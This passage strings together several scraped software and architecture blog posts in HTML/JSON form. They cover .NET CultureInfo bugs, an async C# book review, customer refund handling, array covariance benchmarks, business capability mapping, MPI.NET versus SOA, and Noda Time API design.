invariant culture:</p><div class=\"code\"><span class=\"Namespace\">using</span>System;<br /><span class=\"Namespace\">using</span>System.Globalization;<br /><br /><span class=\"ReferenceType\">class</span>Test<br />{<br />   <span class=\"Modifier\">static</span> <span class=\"ValueType\">void</span>Main()<br />    {        <br />        CultureInfo clone = (CultureInfo) CultureInfo.InvariantCulture.Clone();<br />       <span class=\"InlineComment\">// Note: not even deliberately changing MonthNames for this culture!</span><br />        clone.DateTimeFormat.MonthGenitiveNames[0] =<span class=\"String\">\"Changed\"</span>;<br />        <br />       <span class=\"InlineComment\">// Prints Changed</span><br />        Console.WriteLine(CultureInfo.InvariantCulture.DateTimeFormat.MonthNames[0]);<br />    }<br />}</div><p>I believe this bug is<em>really</em>due to the lack of support for genitive month names in Mono at the moment - the MonthGenitiveNames property always just returns a reference to the month names for the invariant culture - without taking a copy first. (It always returns the invariant culture's month names, even if you're using a different culture entirely.) The code above shows an\"innocent\" attempt to change a mutable clone - but in reality we could have used<em>any</em>culture (including an immutable one) to make the change.</p><p>Note that in the .NET implementation, the change would only have been to a copy of the underlying data, so even the<em>clone</em>wouldn't have reflected change anywhere.</p><h2>Second bug: ReadOnly losing changes</h2><p>The second bug is the one I found this morning. It looks like it's fixed in .NET 4, but it's present in .NET 3.5, which is where it bit me this morning. When you try to make a read-only wrapper around a mutated culture, some of the properties are preserved... but some aren't:</p><div class=\"code\"><span class=\"Namespace\">using</span>System;<br /><span class=\"Namespace\">using</span>System.Globalization;<br /><br /><span class=\"ReferenceType\">class</span>Test<br />{<br />   <span class=\"Modifier\">static</span> <span class=\"ValueType\">void</span>Main()<br />    {<br />        CultureInfo clone = (CultureInfo) CultureInfo.InvariantCulture.Clone();<br />        clone.DateTimeFormat.AMDesignator =<span class=\"String\">\"ChangedAm\"</span>;<br /><br />       <span class=\"InlineComment\">// The array is recreated on each call to MonthNames, so changing the</span><br />       <span class=\"InlineComment\">// value within the array itself doesn't work :(</span><br />       <span class=\"ReferenceType\">string</span>[] months = (<span class=\"ReferenceType\">string</span>[]) clone.DateTimeFormat.MonthNames;<br />        months[0] =<span class=\"String\">\"ChangedMonth\"</span>;<br />        clone.DateTimeFormat.MonthNames = months;<br />        <br />        CultureInfo readOnlyCopy = CultureInfo.ReadOnly(clone);<br />        Console.WriteLine(clone.DateTimeFormat.AMDesignator);<span class=\"InlineComment\">// ChangedAm</span><br />        Console.WriteLine(clone.DateTimeFormat.MonthNames[0]);<span class=\"InlineComment\">// ChangedMonth</span><br />                <br />        Console.WriteLine(readOnlyCopy.DateTimeFormat.AMDesignator);<span class=\"InlineComment\">// ChangedAm</span><br />        Console.WriteLine(readOnlyCopy.DateTimeFormat.MonthNames[0]);<span class=\"InlineComment\">// January (!)</span><br />    }<br />}</div><p>I don't know what's going on here. In the end I just left the test code using the mutable clone, having added a comment explaining<em>why</em>it wasn't created a read-only wrapper.</p><p>I've experimented with a few different options here, including setting the MonthNames property on the clone<em>after</em>creating the wrapper. No joy - I simply can't make the new month names stick in the read-only copy.&lt;sigh&gt;</p><h2>Conclusion</h2><p>I've been frustrated by the approach we've taken to cultures in Noda Time for a while. I haven't worked out exactly what we should do about it yet, so it's likely to stay somewhat annoying for v1, but I may well revisit it significantly for v2. Unfortunately, there's nothing I can do about CultureInfo itself.</p><p>What I would have<em>preferred</em>in all of this is the builder pattern: make CultureInfo, DateTimeFormatInfo etc all immutable, but give each of them mutable builder types, with the ability to create a mutable builder based on an existing immutable instance, and obviously to create a new immutable instance from a builder. That would make all kinds of things simpler - including caching.</p><p>For the moment though, I hope we can all learn lessons from this - or have old lessons reinforced, at least:</p><ul><li>Making a single type behave in different ways based on different\"modes\" makes it hard to use correctly. (Yes, this is the same first conclusion as with DateTime in the previous post. Funny, that.)</li><li>Immutability has to be deep to be meaningful: it's not much use having a supposedly read-only object which composes a StringBuilder...</li><li>Arrays should be<a href=\"http://blogs.msdn.com/b/ericlippert/archive/2008/09/22/arrays-considered-somewhat-harmful.aspx\">considered somewhat harmful</a>. If you're going to return an array from a method, make sure you document whether this is a<em>copy</em>of the underlying data, or a\"live\" reference. (The latter should be very rare, particularly for a public API.) The exception here is if you return an empty array - that's effectively immutable, so you can always return it with no problems.</li><li>The builder pattern rocks - use it!</li></ul><p>In my next post I'll try to get back to the TimeZoneInfo oddities I mentioned last time.</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1809562\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/BISytg6yMcs\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1284}}

He mentioned that he was in the process of writing a short book for O'Reilly about async in C# 5, and I offered to review it for him. Many months later (sorry Alex!) I'm finally getting round to it.</p><p><strong>Disclaimer:</strong>The review copy was given to me for free, and equally the book is arguably a competitor of the upcoming 3rd edition of C# in Depth from the view of readers who already own the 2nd edition... so you could say I'm biased in both directions. Hopefully they cancel out.</p><p>This is a book purely on async. It's not a general C# book, and it doesn't even cover the tiny non-async features in C# 5. It's<em>all</em>about asynchrony. As you'd expect, it's therefore pretty short (92 pages) and can comfortably be consumed in a single session. Alex's writing style is informal and easy to read. Of course the<em>topic</em>of the book is anything but simple, so even though you may read the whole book in one go first time, that doesn't mean you're likely to fully internalize it straight away. The book is divided into 15 short chapters, so you can revisit specific areas as and when you need to.</p><blockquote><p><strong>Aside</strong></p><p>I've been writing and speaking about async for about two and a half years now. I've tried various ways of explaining it, and I'm pretty sure it's one of those awkward concepts which really just needs to click eventually. I've had some mails from people for whom my explanation was the one to do the trick... and other mails from folks who only\"got it\" after seeing another perspective. I'd encourage anyone learning about async to read a variety of books, articles, blog posts and so on. I don't even think it's a matter of finding the single\"right\" explanation for you – it's a matter of letting them all percolate.</p></blockquote><p>The book covers all the topics you'd expect it to:</p><ul><li>Why asynchrony is important</li><li>Drawbacks of library-only approaches</li><li>How async/await behaves in general</li><li>Threading and synchronization contexts</li><li>Exceptions</li><li>Different code contexts (ASP.NET, WinRT, regular UI apps)</li><li>How async code is compiled</li></ul><p>Additionally there are brief sections on unit testing, parallelism and actors. Personally I'd have preferred the actors part to be omitted, with more discussion on the testing side – particularly in terms of how to write deterministic asynchronous tests. However, I know that Alex is a big fan of actors, so I can forgive a little self-indulgence on that front.</p><p>There's one area where I'm not sure I agree with the advice in the book: exceptions. Alex repeatedly gives the advice that you shouldn't let exceptions go unobserved. I used to go along with that almost without thinking – but now I'm not so sure. There are definitely cases where that definitely<em>is</em>the case, but I'm not as comfortable with the global advice as I used to be. I'll try to put my thoughts in order on this front and blog about this separately at a later date.</p><p>That aside, this is a good, pragmatic book. To be honest, I suspect no book on async is going to go into quite as many details as<a href=\"http://blogs.msdn.com/b/pfxteam/\">the PFX team blog</a>, and that's probably a good thing. But\"Async in C# 5.0\" is a very good starting point for anyone wanting to get to grips with async, and I in no way begrudge any potential C# in Depth 3rd edition sales I may lose by saying so ;)</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1830869\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/2WGaSufZ7Og\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1285}}

I think truly serving the Customer sometimes means asking questions, and sometimes even saying \"No\"...</p><p><img src='http://wekeroad.com/images/service.jpeg'/></p><p><h2>May I Help You?</h2><p>I receive a number of support emails during the normal work week. They are mostly technical ones about our streaming player or questions about our content. Occasionally requests for certain topics.</p><p>And then there are the requests for refunds. This happens rather rarely, but when they do I tend to take extra time with them. This tends to piss people off and typically I have to wade through a lot of back and forth before we get down to the problem.</p><p>The following really happened, and (as you might expect) I'm paraphrasing a bit - not revealing names:</p><blockquote><p><strong>Customer</strong>:\"I don't find your service worth it and would like my money back.\"</p><p><strong>Me</strong>:\"Sorry to hear that! What's the problem\"</p><p><strong>Customer</strong>:\"As I said I don't find value in your videos - can I have a refund or not? Is this going to be one of those things that I have to fill out some questionnaire or stupid survey. DUDE JUST CANCEL MY SUB\"</p></blockquote><p>So at this point I have a problem. Do I continue asking him about the problem or do I just refund him and remember that\"The Customer is Always Right\". What would you do?</p><p>One thing I know is that an unhappy customer, tended to correctly, will rapidly turn into one of your happiest customers. It's a gamble, especially when CAPS are invoked... but I pressed on.</p><blockquote><p><strong>Me</strong>: Listen I understand you're not happy but sometimes it comes down to knowing just a bit more about a problem and I can fix it - and often it makes people very happy. If you had the time to explain just a bit - I would really appreciate it. Your refund is on the way, by the way.</p></blockquote><p>This is one of my standard responses. Typically (not always) I will send the refund immediately. Upset people tend to become less upset, and then answer your questions. In this case, it worked out really well:</p><blockquote><p><strong>Customer</strong>: Sorry I should be a bit more clear. I<strong>love your videos</strong>and they're really good, but I can't afford the service and I thought I could but I just lost my job and I need to pull things back in. I didn't mean to be insulting and I guess I'm a bit stressed out. Thanks for the refund and if I get another job soon I'll come back.</p><p><strong>Me</strong>: No problem at all and thanks for letting me know this - it really does make a difference. XXXXXXXXX - that's a coupon for an Annual Subscription. Educating yourself will help find work and, if you want to pay me back,<a href=\"http://tekpub.com/gifts/new\">buy an annual for someone else</a>.</p></blockquote><p>Needless to say, the Customer was ecstatic and we solved the problem - something I would never have known about unless I pushed a little bit -<strong>pushed the Customer to let me help them</strong>.</p><p>I give stuff away constantly - especially to people who need it.</p><h2>This Backfires</h2><p>Just today - in fact it's the reason I'm writing this post - someone asked me for a refund. It was the first in 4 months and, as I do, I asked some questions first.</p><p>Many businesses adopt a\"No Questions Asked\" policy and I understand why - it's a blind guarantee and gives the appearance of standing squarely behind your product or service.</p><p>I find that this is short-sited but NOT because you shouldn't blindly guarantee your stuff, but<strong>it's more likely there's simply a misunderstanding happening, and you can FIX IT</strong>.</p><p>So anyway the Customer wanted a refund:</p><blockquote><p><strong>Customer</strong>: I want a refund for my monthly subscription because Pluralsight has more content than you.</p><p><strong>Me</strong>: They sure do, but I can't guarantee our stuff against another company's. I do know you'll be happy with what we offer because it's quite good and I notice you've only watched half of a single episode of all of our stuff. Might I recommend you give it some more time?</p><p><strong>Customer</strong>: I didn't ask you to guarantee Pluralsight - but you should do something to compare your stuff vs. theirs so people know the difference. Your refund policy states\"...'snip' ...\" Thus I'd like a refund.</p></blockquote><p>Here I have a problem. They haven't watched any of our stuff and are, essentially, having\"Buyer's Remorse\" as they saw more stuff at Pluralsight.<a href=\"http://pluralsight.com/training/Courses\">And Pluralsight has a whole lot of stuff</a>. Buyer's remorse and Pluralsight's catalog are not covered under our refund policy (as you can imagine) so...</p><p>If I keep pushing this angle, I'll lose. Pluralsight has an amazing library but there are differences in our content - I need to get that across as well as the main point:<strong>Why not have both!</strong>. It's $15 + $29 == $45/month. Think of what that means in terms of educating yourself and readying your career! Yet people scrutinize this expense as if it were some kind of luxury!</p><p>OK, so back to the matter at hand. How would you respond here? This is what I said:</p><blockquote><p><strong>Me:</strong>Our return policy covers what<strong>we create</strong>and if you don't like it, then yes we'll stand behind that. But you haven't tried it out yet and, forgive me if I'm misunderstanding here, you're asking for a refund because Pluralsight has more stuff.</p><p>I don't want unhappy customers and I'm sending your refund now - but when you get to Pluralsight you might not want to look at Lynda.com.</p><p>If you use Peepcode don't try CodeSchool or Treehouse. What you see as an advantage (more videos) is hardly a measure of the content (and its relevance to you). Either way, your refund is on its way\"</p></blockquote><p>I should have left that last part out. That was my ego, feeling bruised and frustration setting in because I felt that what they were asking for was not entirely fair.</p><p>And, as expected, the customer didn't like my response.<strong>Things started getting personal and I was told my Customer Service sucks</strong>(which wouldn't be the first time). The Customer ended things by saying\"I was planning on coming back to Tekpub if I didn't like Pluralsight but... not with this Customer Service experience\".</p><p>Which means I lose. Actually, we both lost because<a href=\"http://support.pluralsight.com/knowledgebase/articles/32815-what-is-your-refund-policy-\">I don't think he'll have the same option at Pluralsight</a>.</p><h2>Turning It Around. Or Turning It Off?</h2><p>I lost that battle because I tried to reason with someone who was unhappy - and that is almost always a bad idea. There are ways of asking questions that don't lead the Customer to believe they're being screwed or messed with - and I was trapped with this one.</p><p>They gave me money, and they regretted it even though they didn't even try what they paid for. To me,<strong>I was utterly convinced that if they tried our stuff, they'd love it</strong>and I kept trying to communicate that... but in the wrong way. I think I understand why many companies simply refuse to do refunds - it forces customers to consider a bit more carefully.</p><p>This is not to say that you shouldn't show Customers the door. I've had people (literally) try to extort me by\"taking it to Hacker News\" unless I refunded them for videos that my logs showed they were clearly sharing (multiple downloads to same IP over the period of a month). I asked them if it's OK to loop in their legal department, then I deleted their account and banned them.</p><p><strong>There are some customers you need to cut loose - basically a No Soup For You</strong>policy. They exist, it sucks, and it spoils it for customers who aren't Out To Get Your (to-date that's happened 5 times and I'm not happy about it... but it needed to happen).</p><p>On the bright side,<strong>I've managed to turn unhappy customers into Big Fans about 85% of the time: simply by asking questions and trying to care</strong>instead of following some old-school, outdated tome.</p></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PZzbWDi8bww:AFQQEzd8wQo:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PZzbWDi8bww:AFQQEzd8wQo:Q8R26LmAkSY\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=PZzbWDi8bww:AFQQEzd8wQo:Q8R26LmAkSY\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PZzbWDi8bww:AFQQEzd8wQo:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=PZzbWDi8bww:AFQQEzd8wQo:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?a=PZzbWDi8bww:AFQQEzd8wQo:F7zBnMyn0Lo\"><img src=\"http://feeds.feedburner.com/~ff/wekeroad/EeKc?i=PZzbWDi8bww:AFQQEzd8wQo:F7zBnMyn0Lo\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/wekeroad/EeKc/~4/PZzbWDi8bww\" height=\"1\" width=\"1\"/>","author":"Rob Conery","_id":{"$wrap":"$oid","v":1286}}

(Writing about async in a way which is both accessible and accurate is really tricky, by the way.)</p><p>Of course when I've finished those, I've got two other C# books I<em>want</em>to be writing... when I'm not working on Noda Time, Tekpub screencasts etc...</p><p><strong>Update</strong></p><p>I had a question on Twitter around the\"two other C# books\". I don't want to go into too many details - partly because they're very likely to change - but my intention is to write\"C# from Scratch\" and\"C# in Style\". The first would be for complete beginners; the second wouldn't go into\"how things work\" so much as\"how to use the language most effectively.\" (Yes, competition for Effective C#.) One possibility is that both would be donationware, at least in ebook form, ideally with community involvement in terms of public comments.</p><p>I'm hoping that both will use the same codebase as an extended example, where\"From Scratch\" would explain what the code does, and\"In Style\" would explain why I chose that approach. Oh, and\"From Scratch\" would use unit testing as a teaching tool wherever possible, attempting to convey the idea that it's something every self-respecting dev does :)</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1814752\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/xkjNKrOKEwk\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1287}}

Time to fix that.</p><p>This material may well be covered elsewhere – it's certainly not terrifically original, and I've been meaning to post about it for a long time. In particular, I remember mentioning it at CodeMash in 2012. Anyway, the time has now come.</p><h2>Refresher on array covariance</h2><p>Just as a bit of background before we delve into the performance aspect, let me remind you what array covariance is, and when it applies. The basic idea is that C# allows a<em>reference conversion</em>from type TDerived[] to type TBase[], so long as:</p><ul><li>TDerived and TBase are both reference types (potentially interfaces)</li><li>There's a reference conversion from TDerived to TBase (so either TDerived is the same as TBase, or a subclass, or an implementing class etc)</li></ul><p>Just to remind you about reference conversions, those are conversions from one reference type to another, where the result (on success) is never a reference to a different object. To quote section 6.1.6 of the C# 5 spec:</p><blockquote><p>Reference conversions, implicit or explicit, never change the referential identity of the object being converted. In other words, while a reference conversion may change the type of the reference, it never changes the type or value of the object being referred to.</p></blockquote><p>So as a simple example, there's a reference conversion from string to object, therefore there's a reference conversion from string[] to object[]:</p><div class=\"code\"><span class=\"ReferenceType\">string</span>[] strings =<span class=\"Keyword\">new</span> <span class=\"ReferenceType\">string</span>[10];<br /><span class=\"ReferenceType\">object</span>[] objects = strings;<br /><br /><span class=\"InlineComment\">// strings and objects now refer to the same object</span></div><p>There is<em>not</em>a reference conversion between value type arrays, so you can't use the same code to conver from int[] to object[].</p><p>The nasty part is that every<em>store</em>operation into a reference type array now has to be checked at execution time for type safety. So to extend our sample code very slightly:</p><div class=\"code\"><span class=\"ReferenceType\">string</span>[] strings =<span class=\"Keyword\">new</span> <span class=\"ReferenceType\">string</span>[10]; <br /><span class=\"ReferenceType\">object</span>[] objects = strings;<br /><br />objects[0] =<span class=\"String\">\"string\"</span>;<span class=\"InlineComment\">// This is fine</span><br />objects[0] =<span class=\"Keyword\">new</span>Button();<span class=\"InlineComment\">// This will fail</span></div><p>The last line here will fail with an ArrayTypeMismatchException, to avoid storing a Button reference in a String[] object. When I said that<em>every</em>store operation has to be checked, that's a slight exaggeration: in theory, if the compile-time type is an array with an element type which is a sealed class, the check can be avoided as it can't fail.</p><h2>Avoiding array covariance</h2><p>I would rather arrays weren't covariant in the first place, but there's not a lot that can be done about that now. However, we can work around this, if we really need to. We know that value type arrays are<em>not</em>covariant... so how about we use a value type array instead, even if we want to store reference types?</p><p>All we need is a value type which can store the reference type we need – which is dead easy with a wrapper type:</p><div class=\"code\"><span class=\"Modifier\">public</span> <span class=\"ValueType\">struct</span>Wrapper&lt;T&gt;<span class=\"Linq\">where</span>T :<span class=\"ReferenceType\">class</span><br />{<br />   <span class=\"Modifier\">private</span> <span class=\"Modifier\">readonly</span>T value;<br />   <span class=\"Modifier\">public</span>T Value { get {<span class=\"Statement\">return</span>value; } }<br />    <br />   <span class=\"Modifier\">public</span>Wrapper(T value)<br />    {<br />       <span class=\"Keyword\">this</span>.value = value;<br />    }<br />    <br />   <span class=\"Modifier\">public</span> <span class=\"Modifier\">static</span> <span class=\"Keyword\">implicit</span> <span class=\"Keyword\">operator</span>Wrapper&lt;T&gt;(T value)<br />    {<br />       <span class=\"Statement\">return</span> <span class=\"Keyword\">new</span>Wrapper&lt;T&gt;(value);<br />    }<br />}</div><p>Now if we have a Wrapper&lt;string&gt;[], we can't assign that to a Wrapper&lt;object&gt;[] variable – the types are incompatible. If that feels a bit clunky, we can put the array into its own type:</p><div class=\"code\"><span class=\"Modifier\">public</span> <span class=\"Modifier\">sealed</span> <span class=\"ReferenceType\">class</span>InvariantArray&lt;T&gt;<span class=\"Linq\">where</span>T :<span class=\"ReferenceType\">class</span><br />{<br />   <span class=\"Modifier\">private</span> <span class=\"Modifier\">readonly</span>Wrapper&lt;T&gt;[] array;<br />    <br />   <span class=\"Modifier\">public</span>InvariantArray(<span class=\"ValueType\">int</span>size)<br />    {<br />        array =<span class=\"Keyword\">new</span>Wrapper&lt;T&gt;[size];<br />    }<br />    <br />   <span class=\"Modifier\">public</span>T<span class=\"Keyword\">this</span>[<span class=\"ValueType\">int</span>index]<br />    {<br />        get {<span class=\"Statement\">return</span>array[index].Value; }<br />        set { array[index] = value; }<br />    }<br />}</div><p>Just to clarify, we now only have<em>value type</em>arrays, but ones where each value is a plain wrapper for a reference. We now can't accidentally violate type-safety at compile-time, and the CLR doesn't need to validate write operations.</p><p>There's no memory overhead here – aside from the type information at the start, I'd actually expect the contents of a Wrapper&lt;T&gt;[] to be indistinguishable from a T[] in memory.</p><h2><strong>Benchmarking</strong></h2><p>So, how does it perform? I've written a small console app to test it. You can download the<a href=\"http://csharpindepth.com/Files/ArrayPerformance.zip\">full code</a>, but the gist of it is that we use a stopwatch to measure how long it takes to either repeatedly write to an array, or repeatedly read from an array (validating that the value read is non-null, just to prove that we've really read something). I'm hoping I haven't fallen foul of any of the various<a href=\"http://tech.pro/blog/1293/c-performance-benchmark-mistakes-part-one\">mistakes in benchmarking</a>which are so easy to make.</p><p>The test tries four scenarios:</p><ul><li>object[] (but still storing strings)</li><li>string[]</li><li>Wrapper&lt;string&gt;[]</li><li>InvariantArray&lt;string&gt;</li></ul><p>Running against an array size of 100, with 100 million iterations per test, I get the following results on my Thinkpad Twist :</p><table cellspacing=\"0\" cellpadding=\"2\" width=\"400\" border=\"1\"><tbody><tr><td valign=\"top\" width=\"133\"><strong>Array type</strong></td><td valign=\"top\" width=\"133\"><strong>Read time (ms)</strong></td><td valign=\"top\" width=\"133\"><strong>Write time</strong></td></tr><tr><td valign=\"top\" width=\"133\">object[]</td><td valign=\"top\" width=\"133\">11842</td><td valign=\"top\" width=\"133\">44827</td></tr><tr><td valign=\"top\" width=\"133\">string[]</td><td valign=\"top\" width=\"133\">12000</td><td valign=\"top\" width=\"133\">40865</td></tr><tr><td valign=\"top\" width=\"133\">Wrapper&lt;string&gt;[]</td><td valign=\"top\" width=\"133\">11843</td><td valign=\"top\" width=\"133\">29338</td></tr><tr><td valign=\"top\" width=\"133\">InvariantArray&lt;string&gt;</td><td valign=\"top\" width=\"133\">11825</td><td valign=\"top\" width=\"133\">32973</td></tr></tbody></table><p>That's just one run, but the results are fairly consistent across runs. The one interesting deviation is the write time for object[] – I've observed it<em>sometimes</em>being the same as for string[], but not consistently. I don't understand this, but it does seem that the JIT isn't performing the optimization for string[] that it could if it spotted that string is sealed.</p><p>Both of the workarounds to avoid array covariance make a noticeable difference to the performance of writing to the array, without affecting read performance. Hooray!</p><h2>Conclusion</h2><p>I think it would be a very rare application which noticed a<em>significant</em>performance boost here, but I do like the fact that this is one of those situations where a cleaner design also leads to better performance, without many obvious technical downsides.</p><p>That said, I doubt that I'll actually be using this in real code any time soon – the fact that it's just\"different\" to normal C# code is a big downside in itself. Hope you found it interesting though :)</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1833608\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/vNRSrTLc02k\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1288}}

But this then begs the question, what is a business capability?  In short, a business capability is something that an organisation<i>does</i>that contributes in some way towards the overall function performed by the organisation.<br /><br />The advantage of business capabilities is their remarkable level of stability.  If we take a typical insurance organisation, it will likely have sales, marketing, policy administration, claims management, risk assessment, billing, payments, customer service, human resource management, rate management, document management, channel management, commissions management, compliance, IT support and human task management capabilities.  In fact, any insurance organisation will very likely have many of these capabilities.<br /><br />This means that any organisation operating within the same vertical industry will have a remarkably similar capability map.  This is a result of the fact that<i>what</i>these organisations do and the services they offer are fundamentally the same.  What differs from one organisation to the next is<i>how</i>these capabilities are implemented.<br /><br />That is, the business processes, applications, data, technologies and human resources (including their roles, skills and knowledge) that support each capability will differ from one organisation to the next; but the nature of the capabilities themselves, the value they deliver, and their core responsibilities will not vary.<br /><br />This means that whether a capability is implemented as a series of completely manual processes executed by employees, whether the capability is completely or partially outsourced, or whether the capability is fully automated with IT systems does not change the nature of the capability itself.  Other capabilities within the organisation are concerned only with the fact that the capability is performed, not<i>how</i>it is performed.<br /><br />As such we can change the implementation of a business capability without affecting any other capabilities supporting the organisation.  This makes for a considerably more stable business architecture description.  One problem commonly faced by business architects is that the organisation continues to change and adapt during the process of mapping out the business processes.<br /><br />This is in part due to the fact that process maps in a typical business architecture tend to span multiple business capabilities.  This significantly increases the number of process maps that contain implementation details of a single business capability.  Consequently when we change the implementation of a business capability, there is a larger number of process maps that need to be updated.<br /><br />By limiting the scope of our process maps to a single business capability, we substantially reduce the number of process maps affected by a change in the implementation of a capability.  As a result, our business architecture description is more stable and by extension more manageable.<br /><br />Business capabilities are hierarchical in nature.  We can decompose a business capability into smaller capabilities that support the broader capability.  We only decompose a capability into smaller capabilities where there is sufficient distinctiveness between those sub-capabilities to warrant separate and distinct process maps to describe those sub-capabilities.<br /><br />Of course there are business processes that span multiple business capabilities.  However, those processes are realised as event driven process chains.  Each business process that executes within a business capability has the ability to raise business relevant events.  Other business processes that execute within other capabilities subscribe to these events in order to trigger the execution of these processes.<br /><br />As such, end-to-end business processes are realised implicitly by virtue of the event publications and subscriptions between processes defined within each business capability.  Note that this notion of business event publication and subscription is not a technology concern.  It is simply a stable means of describing how business processes execute within an enterprise.<br /><br />Now, this is a really nice way of modelling a business architecture.  But what is the relevance to SOA?  Well, when we apply the SOA style of architecture to the business architecture domain we are concerned with<a href=\"http://bill-poole.blogspot.com/2008/06/business-services.html\">business services</a>.  A business service is modelled around a business capability that has an appropriate level of coupling and cohesion.<br /><br />If we choose a business capability that addresses too many unrelated concerns, then we will have low cohesion.  If we choose a business capability that is too finely grained, we will have tight coupling between services as related concerns will be distributed across multiple business services.<br /><br />So here we see that business capability mapping is an extremely valuable tool for deriving the business service model for an organisation.  It is important to note that this entire discussion falls within the business architecture domain.  The technical components that support a business service fall into the domain of the application and technology architecture.<br /><br />We find that the business service model is an incredibly valuable tool for achieving alignment between the business and IT domains.  This is because this single model has equal relevance in both domains.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/ClGOm_-tQag\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1289}}

Often, the same program runs on different nodes, but takes on different roles on each node.  The role each program instance takes on each node can be determined by a unique rank assigned by the MPI environment to each MPI process.<br /><br />Messages can then be passed between different processes to coordinate their activities.  Often the program detects if it is rank zero and if so takes on the \"root\" responsibility, handing data and control messages to the other nodes, coordinating their activities and aggregating their results.<br /><br />The message exchange patterns offered by MPI.NET are<i>point-to-point</i>,<i>all-to-one</i>(gathering data),<i>one-to-all</i>(broadcast) and<i>all-to-all</i>.  These message exchange patterns differ from the message exchange pattern inherent to EDA, publish-subscribe.<br /><br />With publish-subscribe, systems subscribe to specific topics or topic specifications.  Messages published onto a given topic are routed to all subscribers that have subscribed to a matching topic specification.  Alternatively, subscriptions may be defined based on message content-based rules.<br /><br />With MPI.NET, there are no subscriptions as such.  Messages may be<i>broadcasted</i>to every node, which then decides whether the message is relevant.  This is a subtle difference, and perhaps one might argue it represents a highly simplified form of EDA.<br /><br />With regards to SOA, it is extremely bad practice for services to share the same business rules or data representation as it couples services too tightly.  The fundamental principle of MPI.NET is that the same logic can/will run on multiple nodes.  The purpose is quite different from SOA.<br /><br />With MPI.NET, you are distributing execution of the same logic across multiple servers for the purpose of increasing performance.  With SOA each service is responsible for its own logic, encapsulated behind its service boundary.<br /><br />Furthermore, the number of nodes allocated in an MPI.NET application is dynamic by design.  With SOA, each service has specific rules and responsibilities.  The number of services cannot be dynamically increased or decreased.<br /><br />Certainly<i>within</i>a service the number of nodes allocated to handle messages could be dynamically adjusted based on load.  However, these nodes are not directly addressable.  They are not visible to the consumers of the service.<br /><br />Another difference is that MPI.NET nodes do not have the concept of endpoints.  One cannot deliver messages to an MPI.NET node across a variety of different bindings via different endpoints.<br /><br />MPI.NET should be seen as a way to implementing a single service internally across multiple machines for the purpose of improving performance.<br /><br />I would say therefore that MPI.NET is not a platform for implementing SOA.  It could be considered as supporting the EDA style of architecture, but only in a very simplistic sense.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/inAj9YuVHoA\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1290}}

It also means reviewing the APIs we've got with a critical eye - whether that's removing extraneous members, adding useful ones, or moving things around. (In particular, writing documentation often suggests where a change would make calling code read more naturally.)</p><p>This post is about one particular section of the API, and the choices available. Although I<em>do</em>go into some detail around the specific calls involved, that's just for context... the underlying choices are ones which could be faced when designing any API. I've rarely spent as much time thinking about API decisions as I have with Noda Time, so hopefully this will prove interesting to you even if you really don't care about Noda Time itself as a project.</p><h1>Introduction: time zones, local date/times and zoned date/times - oh my!</h1><p>(Okay, so that's not quite as snappy as<a href=\"http://youtu.be/peh61wd-53w?t=42s\">the Judy Garland version</a>, but hey...)</p><p>The area of API we're going to focus on is time zones, and converting between\"local\" date/time values and\"zoned\" ones. The three types involved are:</p><ul><li><strong>LocalDateTime</strong>: a\"local\" date and time, with no specific time zone. So, something like\"7:30 in the evening on February 27th 2012\". This means different instants in time in different time zones, of course: if you're arranging a meeting, it's good enough when the attendees are in the same time zone, but not good enough if you're meeting with someone on the other side of the world. (A LocalDateTime also has an associated calendar system, but I'm not going to talk about that much in this post.)</li><li><strong>DateTimeZone</strong>: a time zone. At its core, this maps<em>any</em>\"instant\" in time to an<em>offset</em>- the difference between UTC and local time in that time zone. The offset changes over time, typically (but not always) due to daylight saving changes.</li><li><strong>ZonedDateTime</strong>: a date and time in a particular time zone, with an offset from UTC to avoid ambiguity in some cases (and for efficiency). This identifies a specific instant in time (simply by subtracting the offset from the local date/time). Conceptually this is equivalent to just maintaining the\"instant\" value, the time zone, and the calendar system - but it's generally cleaner to think of it as a\"local\" value with an offset from UTC.</li></ul><p>If those brief descriptions don't make sense for you at the moment (this sort of thing is quite hard to describe concisely and precisely) you may want to see whether the Noda Time<a href=\"http://noda-time.googlecode.com/hg/docs/userguide/concepts.html\">user guide\"concepts\" page</a>helps.</p><h3>The API task: mapping from { LocalDateTime, DateTimeZone } to ZonedDateTime</h3><p>It's easy to get from a ZonedDateTime to a LocalDateTime - you can just use the LocalDateTime property. The difficult bit is the other way round. We obviously want to be able to create a ZonedDateTime from the combination of a LocalDateTime and a DateTimeZone, but the question is where to put this functionality. Three options suggest themselves:</p><ul><li>A static method (or constructor) in ZonedDateTime which 